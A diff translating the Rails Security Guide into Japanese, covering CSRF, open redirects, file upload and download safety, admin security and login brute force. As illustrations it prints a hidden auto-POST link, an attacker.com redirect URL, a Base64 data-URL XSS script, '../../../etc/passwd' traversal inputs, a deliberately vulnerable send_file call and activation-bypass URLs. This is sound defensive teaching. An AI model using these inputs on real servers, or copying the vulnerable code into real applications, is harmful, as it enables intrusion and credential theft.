-NOTE: _First, as is required by the W3C, use GET and POST appropriately. Secondly, a security token in non-GET requests will protect your application from CSRF._
+NOTE: **第一に、W3Cが要求しているとおり、GETとPOSTを適切に使いましょう。第二に、GET以外のリクエストにセキュリティトークンを追加することで、WebアプリケーションをCSRFから守ることができます。**
 
-The HTTP protocol basically provides two main types of requests - GET and POST (DELETE, PUT, and PATCH should be used like POST). The World Wide Web Consortium (W3C) provides a checklist for choosing HTTP GET or POST:
+HTTPプロトコルは2つの基本的なリクエストであるGETとPOST(DELETE、PUT、PATCHはPOSTと同様に使われるべきです)を提供しています 。World Wide Web Consortium (W3C) は、HTTPのGETやPOSTを選択する際のチェックリストを提供しています。
 
-**Use GET if:**
+**以下の場合はGETを使うこと**
 
-* The interaction is more _like a question_ (i.e., it is a safe operation such as a query, read operation, or lookup).
+* そのやりとりが基本的に**問い合わせ**である場合 (クエリ、読み出し操作、検索のような安全な操作)
 
-**Use POST if:**
+**以下の場合はPOSTを使うこと**
 
-* The interaction is more _like an order_, or
-* The interaction _changes the state_ of the resource in a way that the user would perceive (e.g., a subscription to a service), or
-* The user is _held accountable for the results_ of the interaction.
+* そのやりとりが基本的に**命令**である場合、または
+* そのやりとりによってユーザーにわかる形でリソースの**状態が変わる**場合 (サービスへの申し込みなど)、または
+* そのやりとりによって生じる結果を**ユーザーが把握できる**場合
 
-If your web application is RESTful, you might be used to additional HTTP verbs, such as PATCH, PUT, or DELETE. Some legacy web browsers, however, do not support them - only GET and POST. Rails uses a hidden `_method` field to handle these cases.
+WebアプリケーションがRESTfulであれば、PATCH、PUT、DELETEなどのHTTPメソッドも使われているでしょう。しかし、一部のブラウザはこれらのメソッドをサポートしていません。確実にサポートされているのはGETとPOSTだけです。Railsでは`_method`という隠しフィールドを使ってこれらのHTTPメソッドをサポートしています。
 
-_POST requests can be sent automatically, too_. In this example, the link www.harmless.com is shown as the destination in the browser's status bar. But it has actually dynamically created a new form that sends a POST request.
+**POSTリクエストも (意図に反して) 自動的に送信されることがありえます**。ブラウザのステータスバーに、www.harmless.com というWebサイトへのリンクが表示されているとします。そしてこのリンクに仕掛けがあり、POSTリクエストをこっそり送信する新しいフォームを動的に作成するようになっているとします。
 
 ```html
 <a href="http://www.harmless.com/" onclick="
@@ -280,54 +246,48 @@ _POST requests can be sent automatically, too_. In this example, the link www.ha
   return false;">To the harmless survey</a>
 ```
 
-Or the attacker places the code into the onmouseover event handler of an image:
+あるいは、攻撃者がこのコードを画像の`onmouseover`イベントハンドラに仕込んであるとします。
 
 ```html
 <img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." />
 ```
 
-There are many other possibilities, like using a `<script>` tag to make a cross-site request to a URL with a JSONP or JavaScript response. The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. To protect against this data leakage, we must disallow cross-site `<script>` tags. Ajax requests, however, obey the browser's same-origin policy (only your own site is allowed to initiate `XmlHttpRequest`) so we can safely allow them to return JavaScript responses.
+`<script>`タグを使って、JSONPやJavaScriptの応答を伴う特定のURLへのクロスサイトリクエストを作成するなど、攻撃方法は多種多様です。このレスポンスは攻撃者が実行方法を見つけ出したコードであり、機密データを取り出せる可能性があります。このようなデータ流出を防止するには、クロスサイトの`<script>`タグを無効にします。ただしAjaxリクエストはブラウザの「同一生成元ポリシー」に従って動作する（`XmlHttpRequest`を開始できるのは自サイトのみ）ため、JavaScriptレスポンスを返すことを安全に許可できます。
 
-NOTE: We can't distinguish a `<script>` tag's origin—whether it's a tag on your own site or on some other malicious site—so we must block all `<script>` across the board, even if it's actually a safe same-origin script served from your own site. In these cases, explicitly skip CSRF protection on actions that serve JavaScript meant for a `<script>` tag.
+Note: `<script>`タグのoriginが同じサイトか悪意のあるサイトかは、区別しようがありません。このため`<script>`タグは、たとえ実際には自サイトからの同一originのスクリプトであっても、全面的にブロックしなければなりません。このような場合、`<script>`を対象にJavaScriptを使う操作については明示的にCSRF保護をスキップしてください。
 
-To protect against all other forged requests, we introduce a _required security token_ that our site knows but other sites don't know. We include the security token in requests and verify it on the server. This is a one-liner in your application controller, and is the default for newly created Rails applications:
+この種の偽造リクエストをすべて防止するには、**必須セキュリティトークン**を導入します。このトークンは自分のサイトだけが知っており、他のサイトは知りません。リクエストにはこのセキュリティトークンを含め、サーバー側でこれを検証します。以下の1行コードはアプリケーションのコントローラに追加するものであり、Railsで新規作成したアプリケーションにはこのコードがデフォルトで含まれます。
 
 ```ruby
 protect_from_forgery with: :exception
 ```
 
-This will automatically include a security token in all forms and Ajax requests generated by Rails. If the security token doesn't match what was expected, an exception will be thrown.
+このコードがあると、Railsで生成されるすべてのフォームとAjaxリクエストにセキュリティトークンが自動的に含まれます。セキュリティトークンがマッチしない場合には例外がスローされます。
 
-NOTE: By default, Rails includes an [unobtrusive scripting adapter](https://github.com/rails/rails/blob/master/actionview/app/assets/javascripts),
-which adds a header called `X-CSRF-Token` with the security token on every non-GET
-Ajax call. Without this header, non-GET Ajax requests won't be accepted by Rails.
-When using another library to make Ajax calls, it is necessary to add the security
-token as a default header for Ajax calls in your library. To get the token, have
-a look at `<meta name='csrf-token' content='THE-TOKEN'>` tag printed by
-`<%= csrf_meta_tags %>` in your application view.
+NOTE: Railsにデフォルトで含まれる[unobtrusive scripting adapter](https://github.com/rails/rails/blob/master/actionview/app/assets/javascripts)が追加する`X-CSRF-Token`というヘッダーには、GET以外のあらゆるAjax呼び出しでセキュリティトークンを含みます。このヘッダーがないと、RailsはGET以外のAjaxリクエストを受け付けなくなります。Ajax呼び出しに他のライブラリを使う場合は、そのライブラリのAjax呼び出しのデフォルトのヘッダーにセキュリティトークンを追加する必要があります。このトークンを取得するにはアプリケーションのビューで`<%= csrf_meta_tags %>`から出力される`<meta name='csrf-token' content='THE-TOKEN'>`タグをご覧ください。
 
-It is common to use persistent cookies to store user information, with `cookies.permanent` for example. In this case, the cookies will not be cleared and the out of the box CSRF protection will not be effective. If you are using a different cookie store than the session for this information, you must handle what to do with it yourself:
+恒常的なcookieにユーザー情報を保存する (たとえば`cookies.permanent`などに) ことはよく行われています。この場合cookieは消去されないことと、前述の保護機構の外ではCSRFからの保護を受けられないことにご注意ください。何らかの理由でこのような情報をセッション以外のcookieストアに保存している場合は、必要な操作を開発者自身が行わなければなりません。
 
 ```ruby
 rescue_from ActionController::InvalidAuthenticityToken do |exception|
-  sign_out_user # Example method that will destroy the user cookies
+  sign_out_user # ユーザーのcookieを削除するメソッドの例
 end
 ```
 
-The above method can be placed in the `ApplicationController` and will be called when a CSRF token is not present or is incorrect on a non-GET request.
+上のメソッドは`ApplicationController`に置くことができます。そして、非GETリクエストにCSRFトークンがない場合やトークンが無効な場合にこのメソッドが呼び出されます。
 
-Note that _cross-site scripting (XSS) vulnerabilities bypass all CSRF protections_. XSS gives the attacker access to all elements on a page, so they can read the CSRF security token from a form or directly submit the form. Read [more about XSS](#cross-site-scripting-xss) later.
+気を付けていただきたいのは、**クロスサイトスクリプティング (XSS) 脆弱性は、あらゆるCSRF保護を迂回してしまう**ということです。XSS脆弱性が存在すると、攻撃者はWebページのあらゆる要素にアクセスできてしまいます。そのため、フォームからCSRFセキュリティトークンを読みだしてそのフォームを直接送信することができてしまいます。後述の<a href="#クロスサイトスクリプティング-xss">XSSの詳細</a>にも目を通してください。
 
-Redirection and Files
+リダイレクトとファイル
 ---------------------
 
-Another class of security vulnerabilities surrounds the use of redirection and files in web applications.
+セキュリティ上の脆弱性として次に検討したいのは、Webアプリケーションにおける「リダイレクトとファイル」です。
 
-### Redirection
+### リダイレクト
 
-WARNING: _Redirection in a web application is an underestimated cracker tool: Not only can the attacker forward the user to a trap web site, they may also create a self-contained attack._
+WARNING: **Webアプリケーションにおけるリダイレクトは、過小評価されがちなクラッキングツールです。攻撃者はこれを使ってユーザーを危険なWebサイトに送り込んだり、Webサイト自体に罠を仕掛けたりすることもできます。**
 
-Whenever the user is allowed to pass (parts of) the URL for redirection, it is possibly vulnerable. The most obvious attack would be to redirect users to a fake web application which looks and feels exactly as the original one. This so-called phishing attack works by sending an unsuspicious link in an email to the users, injecting the link by XSS in the web application or putting the link into an external site. It is unsuspicious, because the link starts with the URL to the web application and the URL to the malicious site is hidden in the redirection parameter: http://www.example.com/site/redirect?to=www.attacker.com. Here is an example of a legacy action:
+リダイレクト用のURL (の一部) を渡すことをユーザーに許すと、潜在的な脆弱性となります。最もあからさまな攻撃方法としては、ユーザーを本物そっくりの偽Webサイトにリダイレクトすることが考えられます。これは俗に「フィッシング(phishing)」や「釣り」などと呼ばれる攻撃手法です。具体的には、無害を装ったリンクを含むメールをユーザーに送りつけ、XSSを使ってそのリンクをWebアプリケーションに注入するか、リンクを外部サイトに配置します。このリンクの冒頭部分はそのWebアプリケーションのURLなので、一見無害に見えます。危険なサイトに導くURLはリダイレクトのパラメータの中に隠されています ( http://www.example.com/site/redirect?to=www.attacker.com )。ここでは`legacy`アクションを例示します。
 
 ```ruby
 def legacy
@@ -335,66 +295,66 @@ def legacy
 end
 ```
 
-This will redirect the user to the main action if they tried to access a legacy action. The intention was to preserve the URL parameters to the legacy action and pass them to the main action. However, it can be exploited by attacker if they included a host key in the URL:
+このコードは、`legacy`アクションに対するアクセスがあれば、ユーザーをメインのアクションにリダイレクトします。このコードの本来の意図は、従来のアクションへのURLパラメータを保護し、それをメインのアクションに渡すことです。しかし、このURLにホスト鍵が含まれていると、攻撃者に悪用される可能性があります。
 
 ```
 http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
 ```
 
-If it is at the end of the URL it will hardly be noticed and redirects the user to the attacker.com host. A simple countermeasure would be to _include only the expected parameters in a legacy action_ (again a permitted list approach, as opposed to removing unexpected parameters). _And if you redirect to a URL, check it with a permitted list or a regular expression_.
+URLの末尾にあるホスト鍵は気付かれにくく、ユーザーは attacker.com ホストにリダイレクトされてしまいます。単純な対応策としては、**legacyアクションでは想定されたパラメータだけを含めるようにする**という方法があります (これはホワイトリスト的アプローチであり、想定されていないパラメータを除外する方法とは真逆です)。 **URLをリダイレクトする場合は、ホワイトリストまたは正規表現でチェックしてください**。
 
-#### Self-contained XSS
+#### 自己完結型XSS
 
-Another redirection and self-contained XSS attack works in Firefox and Opera by the use of the data protocol. This protocol displays its contents directly in the browser and can be anything from HTML or JavaScript to entire images:
+FirefoxやOperaのデータプロトコルを使って、別のタイプのリダイレクションや自己完結型XSS攻撃を実行できてしまいます。データプロトコルは、その内容をブラウザに直接表示できます。しかも、HTML、JavaScriptや丸ごとの画像イメージなど、何でも含められます。
 
 `data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K`
 
-This example is a Base64 encoded JavaScript which displays a simple message box. In a redirection URL, an attacker could redirect to this URL with the malicious code in it. As a countermeasure, _do not allow the user to supply (parts of) the URL to be redirected to_.
+この例ではBase64でエンコードされたJavaScriptを使っています。このJavaScriptは単にメッセージボックスを表示します。リダイレクションURL攻撃では、攻撃者がこのような悪意のあるコードを含んだURLへのリダイレクトを行います。この攻撃への対応策は、**リダイレクトするURL(あるいはその一部)をユーザーから渡せないようにすること**です。
 
-### File Uploads
+### ファイルアップロード
 
-NOTE: _Make sure file uploads don't overwrite important files, and process media files asynchronously._
+NOTE: **ファイルがアップロードされたときに重要なファイルが上書きされることのないようにしましょう。また、メディアファイルの処理は非同期で行なうようにしましょう。**
 
-Many web applications allow users to upload files. _File names, which the user may choose (partly), should always be filtered_ as an attacker could use a malicious file name to overwrite any file on the server. If you store file uploads at /var/www/uploads, and the user enters a file name like "../../../etc/passwd", it may overwrite an important file. Of course, the Ruby interpreter would need the appropriate permissions to do so - one more reason to run web servers, database servers, and other programs as a less privileged Unix user.
+多くのWebアプリケーションでは、ユーザーがファイルをアップロードできるようになっています。**ユーザーが選択/入力できるファイル名 (またはその一部) は必ずフィルタしてください。**攻撃者が危険なファイル名をわざと使ってサーバーのファイルを上書きしようとする可能性があるためです。ファイルが /var/www/uploads ディレクトリにアップロードされ、そのときにファイル名が「../../../etc/passwd」と入力されていると、重要なファイルが上書きされてしまう可能性があります。言うまでもなく、Rubyインタプリタにそれだけの実行権限が与えられていなければ、そのような上書きは実行できません。Webサーバー、データベースサーバーなどのプログラムは、比較的低い権限を持つUnixユーザーとして実行されているのが普通です。
 
-When filtering user input file names, _don't try to remove malicious parts_. Think of a situation where the web application removes all "../" in a file name and an attacker uses a string such as "....//" - the result will be "../". It is best to use a permitted list approach, which _checks for the validity of a file name with a set of accepted characters_. This is opposed to a restricted list approach which attempts to remove not allowed characters. In case it isn't a valid file name, reject it (or replace not accepted characters), but don't remove them. Here is the file name sanitizer from the [attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master):
+さらにもう一つ注意があります。ユーザーが入力したファイル名をフィルタするときに、**ファイル名から危険な部分を取り除くアプローチを使わないでください**。Webアプリケーションがファイル名から「../」という文字を取り除くことができるとしても、今度は攻撃者が「....//」のようなその裏をかくパターンを使えば、やはり「../」という相対パスが通ってしまい、きりがありません。最も良いのは「ホワイトリスト」によるアプローチです。これは **ファイル名が有効であるかどうか (指定された文字だけが使われているかどうか) をチェックするものです**。これは「ブラックリスト」アプローチと逆の手法であり、利用が許されてない文字を除去します。ファイル名が無効の場合は、拒否するか、無効な文字を置き換えますが、取り除くわけではありません。[attachment_fu plugin](https://github.com/technoweenie/attachment_fu/tree/master)のファイル名サニタイザを以下に示します。
 
 ```ruby
 def sanitize_filename(filename)
   filename.strip.tap do |name|
-    # NOTE: File.basename doesn't work right with Windows paths on Unix
-    # get only the filename, not the whole path
+    # メモ: File.basenameは、Unix上でのWindowsパスに対しては正常に動作しません
+    # フルパスではなくファイル名のみを取得
     name.sub! /\A.*(\\|\/)/, ''
-    # Finally, replace all non alphanumeric, underscore
-    # or periods with underscore
+    # 最終的に非英数文字をアンダースコアまたは
+    # ピリオドとアンダースコアに置き換え
     name.gsub! /[^\w\.\-]/, '_'
   end
 end
 ```
 
-A significant disadvantage of synchronous processing of file uploads (as the attachment_fu plugin may do with images), is its _vulnerability to denial-of-service attacks_. An attacker can synchronously start image file uploads from many computers which increases the server load and may eventually crash or stall the server.
+(attachment_fuプラグインが画像に対して行なうように) ファイルのアップロードを同期的に行なうと、セキュリティ上かなり不利になります。**サービス拒否 (DoS) 攻撃の脆弱性**が生じるためです。攻撃者は、同期的に行われる画像ファイルアップロードを多数のコンピュータから同時に実行することで、サーバーに高負荷をかけて最終的にサーバーをクラッシュまたは動作停止に陥らせます。
 
-The solution to this is best to _process media files asynchronously_: Save the media file and schedule a processing request in the database. A second process will handle the processing of the file in the background.
+これに対する最善のソリューションは、**メディアファイルを非同期的に処理すること**です。メディアファイルを保存し、その後データベース内への処理のリクエストをスケジューリングします。2番目の処理は、バックグラウンドで行います。
 
-### Executable Code in File Uploads
+### ファイルアップロードで実行可能なコードを送り込む
 
-WARNING: _Source code in uploaded files may be executed when placed in specific directories. Do not place file uploads in Rails' /public directory if it is Apache's home directory._
+WARNING: **アップロードされたファイルに含まれるソースコードが特定のディレクトリに置かれると、ソースコードが実行可能になってしまう可能性があります。Railsの/publicディレクトリがApacheのホームディレクトリになっている場合は、ここにアップロードファイルを置いてはいけません。**
 
-The popular Apache web server has an option called DocumentRoot. This is the home directory of the web site, everything in this directory tree will be served by the web server. If there are files with a certain file name extension, the code in it will be executed when requested (might require some options to be set). Examples for this are PHP and CGI files. Now think of a situation where an attacker uploads a file "file.cgi" with code in it, which will be executed when someone downloads the file.
+広く使われているApache Webサーバーには`DocumentRoot`というオプションがあります。これはWebサイトのホームディレクトリであり、このディレクトリツリーに置かれているものはすべてWebサーバーによって取り扱われます。そこに置かれているファイルの名前に特定の拡張子が与えられていると、それに対してリクエストが送信された時に実行されてしまうことがあります (何らかのオプションを与える必要があるかもしれません)。実行される可能性のある拡張子は、たとえばPHPやCGIなどです。攻撃者が「file.cgi」というファイルをアップロードし、その中に危険なコードが仕込まれているとします。このファイルを誰かがダウンロードすると、このコードが実行されます。
 
-_If your Apache DocumentRoot points to Rails' /public directory, do not put file uploads in it_, store files at least one level upwards.
+**Apacheの`DocumentRoot`がRailsの/publicディレクトリを指している場合、アップロードファイルをここに置かないでください**。少なくとも1階層上に保存する必要があります。
 
-### File Downloads
+### ファイルのダウンロード
 
-NOTE: _Make sure users cannot download arbitrary files._
+NOTE: **ユーザーが任意のファイルをダウンロードできる状態を作らないこと。**
 
-Just as you have to filter file names for uploads, you have to do so for downloads. The send_file() method sends files from the server to the client. If you use a file name, that the user entered, without filtering, any file can be downloaded:
+ファイルアップロード時にファイル名のフィルタが必要になるのと同様、ファイルのダウンロード時にもファイル名をフィルタする必要があります。以下の`send_file()`メソッドは、サーバーからクライアントにファイルを送信します。フィルタ処理されていないファイル名を使うと、ユーザーが任意のファイルをダウンロードできるようになってしまいます。
 
 ```ruby
 send_file('/var/www/uploads/' + params[:filename])
 ```
 
-Simply pass a file name like "../../../etc/passwd" to download the server's login information. A simple solution against this, is to _check that the requested file is in the expected directory_:
+「../../../etc/passwd」のようなファイル名を渡せば、サーバーのログイン情報をダウンロードできてしまいます。これに対するシンプルな対応策は、**リクエストされたファイル名が、想定されているディレクトリの下にあるかどうかをチェックする**ことです。
 
 ```ruby
 basename = File.expand_path('../../files', __dir__)
@@ -404,149 +364,149 @@ raise if basename !=
 send_file filename, disposition: 'inline'
 ```
 
-Another (additional) approach is to store the file names in the database and name the files on the disk after the ids in the database. This is also a good approach to avoid possible code in an uploaded file to be executed. The attachment_fu plugin does this in a similar way.
+その他に、ファイル名をデータベースに保存しておき、データベースのidをサーバーのディスク上に置く実際のファイル名の代りに使う方法も併用できます。この方法も、アップロードファイルが実行される可能性を回避する方法として優れています。attachment_fuプラグインでも同様の手法が採用されています。
 
-Intranet and Admin Security
+イントラネットとAdminのセキュリティ
 ---------------------------
 
-Intranet and administration interfaces are popular attack targets, because they allow privileged access. Although this would require several extra-security measures, the opposite is the case in the real world.
+イントラネットおよび管理画面インターフェイスは、強い権限が許されているため、何かと攻撃の目標にされがちです。イントラネットおよび管理画面インターフェイスには、他よりも手厚いセキュリティ対策が必要ですが、現実には逆にむしろこれらの方がセキュリティ対策が薄いということがしばしばあります。
 
-In 2007 there was the first tailor-made trojan which stole information from an Intranet, namely the "Monster for employers" web site of Monster.com, an online recruitment web application. Tailor-made Trojans are very rare, so far, and the risk is quite low, but it is certainly a possibility and an example of how the security of the client host is important, too. However, the highest threat to Intranet and Admin applications are XSS and CSRF. 
+2007年、その名も Monster.com というオンラインリクルート用Webアプリケーションで、特別に作られたトロイの木馬プログラムによってイントラネットから情報が盗み出され、文字どおり経営者にとってのモンスターとなった事件がありました。トロイの木馬をわざわざ特別に誂えるというのはこれまでも非常にまれなことであり、リスクとしては相当低いと言えますが、それでもゼロではありませんし、クライアントホストのセキュリティも重要であるという好例でもあります。ただし、イントラネットや管理アプリケーションにとって最も脅威なのはXSSとCSRFです。
 
-**XSS** If your application re-displays malicious user input from the extranet, the application will be vulnerable to XSS. User names, comments, spam reports, order addresses are just a few uncommon examples, where there can be XSS.
+**XSS:** 悪意のあるユーザーがイントラネットの外から入力したデータがWebアプリケーションで再表示されると、WebアプリケーションがXSS攻撃に対して脆弱になります。ユーザー名、コメント、スパムレポート、注文フォームの住所のような情報すらXSS攻撃に使われることがあります。
 
-Having one single place in the admin interface or Intranet, where the input has not been sanitized, makes the entire application vulnerable. Possible exploits include stealing the privileged administrator's cookie, injecting an iframe to steal the administrator's password or installing malicious software through browser security holes to take over the administrator's computer.
+管理画面やイントラネットで1箇所でもサニタイズ漏れがあれば、アプリケーション全体が脆弱になってしまいます。想定される攻撃としては、管理者のcookieの盗み出し、管理者パスワードを盗み出すためのiframe注入、管理者権限奪取のためにブラウザのセキュリティホールを経由して邪悪なソフトウェアをインストールする、などが考えられます。
 
-Refer to the Injection section for countermeasures against XSS.
+XSS対策の注入に関する節を参照してください。
 
-**CSRF** Cross-Site Request Forgery (CSRF), also known as Cross-Site Reference Forgery (XSRF), is a gigantic attack method, it allows the attacker to do everything the administrator or Intranet user may do. As you have already seen above how CSRF works, here are a few examples of what attackers can do in the Intranet or admin interface.
+**CSRF:** クロスサイトリクエストフォージェリ (Cross-Site Request Forgery) はクロスサイトリファレンスフォージェリ (XSRF: Cross-Site Reference Forgery) とも呼ばれ、非常に強力な攻撃手法です。この攻撃を受けると、管理者やイントラネットユーザーができることをすべて行えるようになってしまいます。CSRFについては既に説明しましたので、ここでは攻撃者がイントラネットや管理画面に対して攻撃を仕掛ける手順をいくつかの事例を示して説明します。
 
-A real-world example is a [router reconfiguration by CSRF](http://www.h-online.com/security/news/item/Symantec-reports-first-active-attack-on-a-DSL-router-735883.html). The attackers sent a malicious e-mail, with CSRF in it, to Mexican users. The e-mail claimed there was an e-card waiting for the user, but it also contained an image tag that resulted in an HTTP-GET request to reconfigure the user's router (which is a popular model in Mexico). The request changed the DNS-settings so that requests to a Mexico-based banking site would be mapped to the attacker's site. Everyone who accessed the banking site through that router saw the attacker's fake web site and had their credentials stolen.
+現実に起きた事例として[CSRFによるルーター再構成](http://www.h-online.com/security/Symantec-reports-first-active-attack-on-a-DSL-router--/news/102352) を取り上げましょう。この攻撃者は、CSRFを仕込んだ危険なメールをメキシコの多数のユーザーに送信しました。このメールには、「お客様のeカードをご用意いたしました」と書かれており、imageタグが含まれていました。そしてそのタグには、ユーザーのルーターを再構成してしまうHTTP GETリクエストが仕込まれていました。このルーターは、メキシコで広く普及しているモデルでした。このリクエストによってDNS設定が変更され、メキシコで事業を行っているネットバンキングWebサイトの一部が、攻撃者のWebサイトにマップされてしまいました。このルーターを経由してこのネットバンキングサイトにアクセスすると、攻撃者が設置した偽のWebサイトが開き、信用情報が盗まれてしまいました。
 
-Another example changed Google Adsense's e-mail address and password. If the victim was logged into Google Adsense, the administration interface for Google advertisement campaigns, an attacker could change the credentials of the victim. 
+Google Adsenseのメールアドレスとパスワードが変更された事例もあります。標的となったユーザーがGoogle Adsenseにログインし、Google広告キャンペーン用の管理画面を開くと、攻撃者が信用情報を盗み出すことができてしまいました。
 
-Another popular attack is to spam your web application, your blog, or forum to propagate malicious XSS. Of course, the attacker has to know the URL structure, but most Rails URLs are quite straightforward or they will be easy to find out, if it is an open-source application's admin interface. The attacker may even do 1,000 lucky guesses by just including malicious IMG-tags which try every possible combination.
+その他の有名な事例としては、危険なXSSを拡散するために一般のWebアプリケーションやブログ、掲示板が利用された事件があります。言うまでもなく、この攻撃を成功させるためには攻撃者がURL構造を知っている必要がありますが、RailsのURLはかなり構造が素直であるため、オープンソースの管理画面を使っていると構造を容易に推測できてしまいます。攻撃者は、ありそうなIDとパスワードの組み合わせを総当りで試す危険なImageタグを送り込むだけで、数千件ものまぐれ当たりを獲得することもあります。
 
-For _countermeasures against CSRF in administration interfaces and Intranet applications, refer to the countermeasures in the CSRF section_.
+**管理画面やイントラネットへのCSRF攻撃への対策については、CSRFの対策についての節を参照してください**。
 
-### Additional Precautions
+### その他の予防策
 
-The common admin interface works like this: it's located at www.example.com/admin, may be accessed only if the admin flag is set in the User model, re-displays user input and allows the admin to delete/add/edit whatever data desired. Here are some thoughts about this:
+管理画面は、多くの場合次のような作りになっているものです。www.example.com/admin のようなURLに置かれ、Userモデルのadminフラグがセットされている場合に限り、ここにアクセスできます。ユーザー入力が管理画面で再表示されると、管理者の権限でどんなデータでも削除/追加/編集できてしまいます。これについて考察してみましょう。
 
-* It is very important to _think about the worst case_: What if someone really got hold of your cookies or user credentials. You could _introduce roles_ for the admin interface to limit the possibilities of the attacker. Or how about _special login credentials_ for the admin interface, other than the ones used for the public part of the application. Or a _special password for very serious actions_?
+* **常に最悪の事態を想定する**ことは極めて重要です。「誰かが自分のcookieやユーザー情報を盗み出すことができたらどうなるか」。管理画面に**ロール (role)**を導入することで、攻撃者が行える操作の範囲を狭めることができます。1人の管理者に全権を与えるのではなく、権限を複数管理者で分散する方法や、管理画面用に**特別なログイン情報**を別途設置するという方法もあります。一般ユーザーが登録されているUserモデルに管理者も登録し、管理者フラグで分類していると攻撃されやすいので、これを避けるためです。**極めて重要な操作では別途特殊なパスワードを要求する**方法もあります。
 
-* Does the admin really have to access the interface from everywhere in the world? Think about _limiting the login to a bunch of source IP addresses_. Examine request.remote_ip to find out about the user's IP address. This is not bullet-proof, but a great barrier. Remember that there might be a proxy in use, though.
+* 管理者は、必ずしも世界中どこからでもそのWebアプリケーションにアクセスできる必要性はないはずです。**送信元IPアドレスを一定の範囲に制限する**という方法を考えてみましょう。`request.remote_ip`メソッドを使えばユーザーのIPアドレスをチェックできます。この方法は攻撃に対する直接の防御にはなりませんが、検問としては非常に有効です。ただし、プロキシを用いて送信元IPアドレスを偽る方法があることもお忘れなく。
 
-* _Put the admin interface to a special subdomain_ such as admin.application.com and make it a separate application with its own user management. This makes stealing an admin cookie from the usual domain, www.application.com, impossible. This is because of the same origin policy in your browser: An injected (XSS) script on www.application.com may not read the cookie for admin.application.com and vice-versa.
+* **管理画面を特別なサブドメインに置き** ( admin.application.com など)、さらに管理アプリケーションを独立させてユーザー管理を独自に行えるようにします。このような構成にすることで、通常の www.application.com ドメインからの管理者cookieを盗み出すことは不可能になります。ブラウザには同一生成元ポリシーがあるので www.application.com に注入されたXSSスクリプトからはadmin.application.comのcookieは読み出せず、逆についても同様に読み出し不可となります。
 
-User Management
+ユーザー管理
 ---------------
 
-NOTE: _Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure._
+NOTE: **認証 (authentication) と認可 (authorization) はほぼすべてのWebアプリケーションにおいて不可欠です。認証システムは自前で作るよりも、広く使われているプラグイン (訳注: 現在ならgem) を使うことをお勧めします。ただし、常に最新の状態にアップデートするようにしてください。この他にいくつかの注意を守ることで、アプリケーションをよりセキュアにすることができます。**
 
-There are a number of authentication plug-ins for Rails available. Good ones, such as the popular [devise](https://github.com/plataformatec/devise) and [authlogic](https://github.com/binarylogic/authlogic), store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in `has_secure_password` method which has similar features.
+Railsでは多数の認証用プラグインを利用できます。人気の高い[devise](https://github.com/plataformatec/devise) や[authlogic](https://github.com/binarylogic/authlogic)などの優れたプラグインは、パスワードを平文ではなく常に暗号化した状態で保存します。Rails 3.1では、同様の機能を持つビルトインの`has_secure_password`メソッドを使えます。
 
-Every new user gets an activation code to activate their account when they get an e-mail with a link in it. After activating the account, the activation_code columns will be set to NULL in the database. If someone requested a URL like these, they would be logged in as the first activated user found in the database (and chances are that this is the administrator):
+新規ユーザーは必ずメール経由でアクティベーションコードを受け取り、メール内のリンク先でアカウントを有効にするようになっています。アカウントが有効になると、データベース上のアクティベーションコードのカラムはNULLに設定されます。以下のようなURLをリクエストするユーザーは、データベースで見つかる最初に有効になったユーザーとしてWebサイトにログインできてしまう可能性があります。そしてそれがたまたま管理者である可能性もありえます。
 
 ```
 http://localhost:3006/user/activate
 http://localhost:3006/user/activate?id=
 ```
 
-This is possible because on some servers, this way the parameter id, as in params[:id], would be nil. However, here is the finder from the activation action:
+一部のサーバーでは、`params[:id]`で参照されるパラメータidがnilになってしまっていることがあるので、上のURLが通用してしまう可能性があります。アクティベーション操作中にこのことが敵に突き止められるまでの流れは以下のとおりです。
 
 ```ruby
 User.find_by_activation_code(params[:id])
 ```
 
-If the parameter was nil, the resulting SQL query will be
+パラメータがnilの場合、以下のSQLが生成されます。
 
 ```sql
 SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
 ```
 
-And thus it found the first user in the database, returned it, and logged them in. You can find out more about it in [this blog post](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/). _It is advisable to update your plug-ins from time to time_. Moreover, you can review your application to find more flaws like this.
+この結果、データベースに実在する最初のユーザーが検索で見つかり、結果が返されてログインされてしまいます。詳しくは[筆者のブログ記事](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)を参照してください。**プラグインは、機会を見てアップデートすることをお勧めします**。さらに、Webアプリケーションにこのような欠陥がないかどうか見直しをかけてください。
 
-### Brute-Forcing Accounts
+### アカウントに対する総当たり攻撃
 
-NOTE: _Brute-force attacks on accounts are trial and error attacks on the login credentials. Fend them off with more generic error messages and possibly require to enter a CAPTCHA._
+NOTE: **アカウントに対する総当たり攻撃 (Brute-force attack) とは、ログイン情報に対して試行錯誤を繰り返す攻撃です。エラーメッセージを具体的でない、より一般的なものにすることで回避可能ですが、CAPTCHA (相手がコンピュータでないことを確認するためのテスト) への情報入力の義務付けもおそらく必要でしょう。**
 
-A list of user names for your web application may be misused to brute-force the corresponding passwords, because most people don't use sophisticated passwords. Most passwords are a combination of dictionary words and possibly numbers. So armed with a list of user names and a dictionary, an automatic program may find the correct password in a matter of minutes.
+Webアプリケーション用のユーザー名リスト (名簿) は、パスワードへの総当たり攻撃に悪用される可能性があります。パスワードがユーザー名と同じなど、単純極まりないパスワードを使っている人が驚くほど多いため、総当たり攻撃にこうした名簿が利用されやすいのです。辞書に載っている言葉に数字を混ぜた程度の弱いパスワードが使われていることもよくあります。従って、名簿と辞書を使って総当り攻撃を行なう自動化プログラムがあれば、ものの数分でパスワードを見破られてしまいます。
 
-Because of this, most web applications will display a generic error message "user name or password not correct", if one of these are not correct. If it said "the user name you entered has not been found", an attacker could automatically compile a list of user names.
